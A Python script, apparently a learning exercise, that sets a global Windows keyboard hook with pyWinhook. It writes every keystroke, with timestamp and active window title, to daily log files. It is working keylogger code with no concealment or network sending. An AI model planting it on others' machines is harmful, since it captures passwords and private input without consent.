# _*_ coding : utf-8 _*_
# __author__ : YiXuan
# date : 2019/7/11

import time,os,sys
import pyWinhook
import pythoncom
import win32api





# 鼠标事件处理函数
def OnMouseEvent(event):
  "监听鼠标事件"
  # print('MessageName:',event.MessageName)  #事件名称
  # print('Message:',event.Message)          #windows消息常量
  # print('Time:',event.Time)                #事件发生的时间戳
  # print('Window:',event.Window)            #窗口句柄
  # print('WindowName:',event.WindowName)    #窗口标题
  # print('Position:',event.Position)        #事件发生时相对于整个屏幕的坐标
  # print('Wheel:',event.Wheel)              #鼠标滚轮
  # print('Injected:',event.Injected)        #判断这个事件是否由程序方式生成，而不是正常的人为触发。
  # print('---')

  # 返回True代表将事件继续传给其他句柄，为False则停止传递，即被拦截
  pass
  return True


def OnKeyboardEvent(event):
  "监听键盘事件"
  # print('MessageName:',event.MessageName)          #同上，共同属性不再赘述
  # print('Message:',event.Message)
  # print('Time:',event.Time)
  # print('Window:',event.Window)
  # print('WindowName:',event.WindowName)
  # print('Ascii:', event.Ascii, chr(event.Ascii))   #按键的ASCII码
  # print('Key:', event.Key)                         #按键的名称
  # print('KeyID:', event.KeyID)                     #按键的虚拟键值
  # print('ScanCode:', event.ScanCode)               #按键扫描码
  # print('Extended:', event.Extended)               #判断是否为增强键盘的扩展键
  # print('Injected:', event.Injected)
  # print('Alt', event.Alt)                          #是某同时按下Alt
  # print('Transition', event.Transition)            #判断转换状态
  # print('---')

  # fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20)
  # fobj.writelines("当前时间（current time）：%s" % time.strftime("%A, %d %b %Y %H:%M:%S", time.gmtime()))
  # fobj.writelines("当前按键对应的窗体（WindowName）：%s" % event.WindowName)
  # fobj.writelines("当前按键对应Ascii（Ascii）：%s" % event.Ascii)
  # fobj.writelines("当前按键对应的名称（KeyName）：%s" % chr(event.Ascii))
  # fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20)
  # fobj.writelines("WindowName:%s\n" % str(event.WindowName))
  # fobj.writelines("Ascii_code: %d\n" % event.Ascii)

  # fobj = open("C:\\Users\\汪洋\\Desktop\\HookRcord.txt", 'w')
  if not os.path.exists(keyboardLogpath):
    os.makedirs(keyboardLogpath)
  if flag:
    localTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    logName = time.strftime('%Y-%m-%d', time.localtime()) + ".txt"

    if not os.path.exists(keyboardLogpath + logName):
      f = open(keyboardLogpath + logName, 'a+')
      f.write("当前时间(localTime)" + " "*30 + "按键AscII码(AscII)" + " "*30 + "按键名称(KeyName)" + " "*30 + "窗体名称(WindowName)\n")
      f.close()

    print(event.Window)
    print(event.WindowName)
    print(event.KeyID)
    logContent = localTime + " "*30 + str(event.Ascii) + " "*50 + (event.Key) + " "*50 + event.WindowName + "\n"
    f = open(keyboardLogpath + logName, 'a+')

    f.write(logContent)
    f.close()

  # 当按键为Esc时，退出监控
  if event.Ascii == 0x1B:
    win32api.PostQuitMessage()  # 表明有个线程有终止请求
    sys.exit()




  # 同上
  return True


def main():
  "创建一个‘钩子’管理对象"
  hm = pyWinhook.HookManager()

  # # 监控鼠标所有按键按下事件
  # hm.MouseAllButtonsDown = OnMouseEvent  # 将OnMouseEvent函数绑定到MouseAllButtonsDown事件上
  # # 设置鼠标钩子
  # hm.HookMouse()

  # 监控键盘所有按键按下事件
  hm.KeyDown = OnKeyboardEvent  # 将OnKeyboardEvent函数绑定到KeyDown事件上
  # 设置键盘钩子
  hm.HookKeyboard()

  # 循环获取消息，手动按下F12方可停止脚本
  pythoncom.PumpMessages()


  # hm.UnhookMouse()    # 取消鼠标钩子
  # hm.UnhookKeyboard() # 取消键盘钩子



if __name__ == '__main__':
  flag = True  # 是否开启日志功能
  mouseLogpath = "log/mouse/"  # 鼠标日志路径
  keyboardLogpath = "log/Kyeboard/"  # 键盘日志路径


  main()
  # 101dD


